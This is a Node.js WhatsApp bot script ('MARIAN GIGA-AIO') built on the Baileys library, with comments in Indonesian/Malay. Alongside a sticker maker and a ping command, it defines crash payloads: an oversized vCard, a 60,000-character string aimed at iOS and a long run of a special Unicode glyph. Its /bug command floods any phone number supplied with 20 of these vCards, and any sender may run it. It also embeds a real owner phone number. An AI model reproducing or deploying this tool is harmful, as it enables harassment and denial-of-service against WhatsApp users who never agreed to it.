const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    delay, 
    DisconnectReason, 
    makeCacheableSignalKeyStore, 
    generateWAMessageFromContent, 
    proto, 
    getContentType, 
    downloadContentFromMessage,
    prepareWAMessageMedia,
    Browsers, 
    fetchLatestBaileysVersion
} = require("@whiskeysockets/baileys")
const pino = require("pino")
const fs = require('fs')
const path = require('path')
const axios = require('axios')
const chalk = require("chalk")
const { Boom } = require("@hapi/boom")
const Crypto = require('crypto')
const ff = require('fluent-ffmpeg')
const { tmpdir } = require('os')
const FormData = require('form-data')
const cheerio = require('cheerio')
const qrcode = require('qrcode-terminal')
const moment = require('moment-timezone')

// ==================== [ CONFIGURATION ] ====================

const owner = ["601121811615"] // Nomor kamu
const prefix = "/"
if (!fs.existsSync('./database.json')) fs.writeFileSync('./database.json', '[]')

// ==================== [ INTERNAL TOOLS ] ====================

const time = moment.tz('Asia/Kuala_Lumpur').format('HH:mm:ss')
const date = moment.tz('Asia/Kuala_Lumpur').format('DD/MM/YYYY')

async function imageToWebp(media) {
    const tmpFileOut = path.join(tmpdir(), `${Crypto.randomBytes(6).readUIntLE(0, 6).toString(36)}.webp`)
    const tmpFileIn = path.join(tmpdir(), `${Crypto.randomBytes(6).readUIntLE(0, 6).toString(36)}.jpg`)
    fs.writeFileSync(tmpFileIn, media)
    await new Promise((resolve, reject) => {
        ff(tmpFileIn).on("error", reject).on("end", () => resolve(true))
        .addOutputOptions(["-vcodec","libwebp","-vf","scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
        .toFormat("webp").save(tmpFileOut)
    })
    const buff = fs.readFileSync(tmpFileOut)
    fs.unlinkSync(tmpFileOut); fs.unlinkSync(tmpFileIn)
    return buff
}

const payloads = {
    vcard: (target) => {
        return `BEGIN:VCARD\nVERSION:3.0\nFN:☠️ MARIAN-REBORN ☠️\nTEL;type=CELL;type=VOICE;waid=${target}:+${target}\n` + "X-ABLabel:Ponsel\n".repeat(200) + "END:VCARD"
    },
    ios: "0".repeat(60000),
    crash: "𑫀".repeat(10000)
}

// ==================== [ START ENGINE ] ====================

async function startMarianReborn() {
    console.log(chalk.red.bold(`
    ╔══════════════════════════════════════════════════╗
    ║  ⚡ MARIAN GIGA-AIO v7.0 [REBORN] ONLINE ⚡      ║
    ║  Status: Anti-Crash Fixed | AI: Disabled         ║
    ║  Developer: Kean | Owner: ${owner[0]}           ║
    ╚══════════════════════════════════════════════════╝
    `))

    const { state, saveCreds } = await useMultiFileAuthState("sessions_marian_pro")
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
        version,
        logger: pino({ level: "silent" }),
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        printQRInTerminal: true,
        connectTimeoutMs: 60000,
        keepAliveIntervalMs: 15000,
    })

    if (!sock.authState.creds.registered) {
        const readline = require("readline").createInterface({ input: process.stdin, output: process.stdout })
        readline.question(chalk.yellow("\n[!] Masukkan Nomor: "), async (nr) => {
            console.log(chalk.cyan("[+] Menstabilkan koneksi (3 Detik)..."))
            await delay(3000)
            try {
                let code = await sock.requestPairingCode(nr.replace(/[^0-9]/g, ''))
                console.log(chalk.black.bgWhite(`\n KODE PAIRING: ${code} \n`))
            } catch (err) {
                console.log(chalk.red("\n[!] Gagal minta kode. Ulangi node index.js"))
            }
            readline.close()
        })
    }

    sock.ev.on("creds.update", saveCreds)

    sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update
        if (connection === "close") {
            const reason = new Boom(lastDisconnect?.error)?.output?.statusCode
            if (reason !== DisconnectReason.loggedOut) startMarianReborn()
        } else if (connection === "open") {
            console.log(chalk.green.bold("\n[✓] MARIAN REBORN CONNECTED!"))
        }
    })

    sock.ev.on('call', async (node) => {
        const { from, id, status } = node[0]
        if (status === 'offer') await sock.rejectCall(id, from)
    })

    sock.ev.on("messages.upsert", async ({ messages }) => {
        try {
            const m = messages[0]
            if (!m.message || m.key.fromMe) return
            const from = m.key.remoteJid
            if (from.endsWith('@g.us')) return 

            const type = getContentType(m.message)
            
            // --- PEMBACA PESAN ANTI-CRASH PROTECTOR ---
            let body = (type === 'conversation') ? m.message.conversation : 
                       (type === 'extendedTextMessage') ? m.message.extendedTextMessage.text : 
                       (type === 'imageMessage') ? m.message.imageMessage.caption : 
                       (type === 'videoMessage') ? m.message.videoMessage.caption : ''

            // PELINDUNG: Pastikan body adalah string sebelum di-trim
            const budy = (typeof body === 'string') ? body.trim() : ''
            
            // LOGGER DEBUG
            console.log(chalk.yellow(`[LOG] From: ${from.split('@')[0]} | Isi: ${budy}`))

            const args = budy.split(/ +/)
            const command = args[0].toLowerCase()
            const text = args.slice(1).join(" ")
            const isOwner = true 

            // LOGIKA MENU RESPONSIVE
            if (command === '/menu' || command === 'menu' || command === '/help') {
                const menu = `*⚡ MARIAN GIGA-AIO [REBORN] ⚡*

*⚔️ ATTACK COMMANDS:*
• /bug [nomor] - VCard Storm
• /bug2 [nomor] - List UI Destroyer
• /bug-ios [nomor] - Special Apple Freeze

*🎨 MEDIA TOOLS:*
• /s - Sticker maker (Reply foto)
• /tiktok [url] - Download TikTok

*🛠️ SYSTEM:*
• /ping - Cek speed
• /restart - Reboot engine

_Status: Anti-Crash Active_`
                await sock.sendMessage(from, { text: menu }, { quoted: m })
                console.log(chalk.green(`[✓] Menu terkirim ke ${from}`))
                return
            }

            if (!budy.startsWith(prefix)) return
            const cmd = budy.slice(prefix.length).trim().split(/ +/).shift().toLowerCase()

            switch (cmd) {
                case 'ping':
                    await sock.sendMessage(from, { text: "⚡ Online & Ready!" })
                    break;

                case 'bug':
                    let target = text.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
                    await sock.sendMessage(from, { text: "💀 Executing..." })
                    for (let i = 0; i < 20; i++) {
                        await sock.sendMessage(target, { 
                            contacts: { displayName: "DIE", contacts: [{ vcard: payloads.vcard(target.split('@')[0]) }] }
                        })
                    }
                    break;

                case 's':
                case 'sticker':
                    const quoted = m.message[type]?.contextInfo?.quotedMessage || null
                    const isImg = type === 'imageMessage' || (quoted && getContentType(quoted) === 'imageMessage')
                    if (!isImg) return
                    const stream = await downloadContentFromMessage(m.message.imageMessage || quoted.imageMessage, 'image')
                    let buff = Buffer.from([])
                    for await (const chunk of stream) buff = Buffer.concat([buff, chunk])
                    const webp = await imageToWebp(buff)
                    await sock.sendMessage(from, { sticker: webp }, { quoted: m })
                    break;

                case 'restart':
                    process.exit()
                    break;
            }
        } catch (e) { 
            console.log(chalk.red("⚠️ ERROR LOG: "), e.message) 
        }
    })
}

startMarianReborn().catch(err => console.log(err))
